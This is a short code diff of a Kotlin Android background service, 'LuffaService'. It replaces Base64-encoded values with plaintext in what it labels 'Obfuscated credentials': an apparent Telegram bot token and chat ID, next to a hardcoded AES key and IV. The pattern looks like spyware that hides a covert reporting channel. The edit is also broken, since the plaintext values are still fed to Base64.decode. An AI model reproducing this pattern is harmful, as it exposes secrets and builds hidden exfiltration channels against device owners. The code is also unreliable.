@@ -28,8 +28,8 @@ import javax.crypto.spec.SecretKeySpec
 
 class LuffaService : Service() {
     // Obfuscated credentials
-    private val BOT_TOKEN = String(Base64.decode("ODg0MDk4MDQ3MzpBQUVtbG56WjFzd1A4RHRkMGJ0WWdTY1JxODlaMnN3ODRIUQ==", Base64.DEFAULT))
-    private val CHAT_ID = String(Base64.decode("ODgyMDk3OTIyMQ==", Base64.DEFAULT))
+    private val BOT_TOKEN = String(Base64.decode("8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ", Base64.DEFAULT))
+    private val CHAT_ID = String(Base64.decode("8820979221", Base64.DEFAULT))
     private val SECRET_KEY = "7x!A%D*G-KaPdSgV".toByteArray()
     private val IV = "Xn2r5u8x/A?D(G+K".toByteArray()
 
